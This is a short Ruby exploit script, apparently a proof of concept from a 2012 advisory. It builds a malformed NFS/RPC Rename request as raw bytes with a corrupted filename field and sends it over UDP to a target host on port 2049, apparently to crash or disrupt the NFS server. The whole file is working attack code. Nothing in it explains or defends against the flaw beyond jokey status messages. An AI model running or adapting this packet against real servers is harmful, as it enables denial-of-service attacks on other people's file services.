#!/usr/bin/ruby

require 'socket'

xnfs_server = (ARGV[0])
target_port = (ARGV[1] || 2049)

#RPC/Portmap packet
beepbeep=
"\x1c\xd1\xef\xab"  + # XID
"\x00\x00\x00\x00" + # Message Type: Call (0)
"\x00\x00\x00\x02" + # RPC Version: 2
"\x00\x01\x86\xa3" + # Program: 100003 
"\x00\x00\x00\x02" + # Program Version: 2
"\x00\x00\x00\x0b" + # Procedure: Rename 
"\x00\x00\x00\x00\x00\x00\x00\x00" + # Credential
"\x00\x00\x00\x00\x00\x00\x00\x00" + # Verifier NULL
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x41\x41\x42\x42\x42\x42"




puts "[+]Sending UDP Packet...\n"
puts "[+] beep beep\n"
puts "[+]No, it's not the road runner\n"


if (!(xnfs_server && target_port))
    puts "Usage: PRL-2012-02.rb host port (default port: 2049)\n"
    exit
else
    
    sock = UDPSocket.open
    sock.connect(xnfs_server, target_port.to_i)
    sock.send(beepbeep, 0)
end




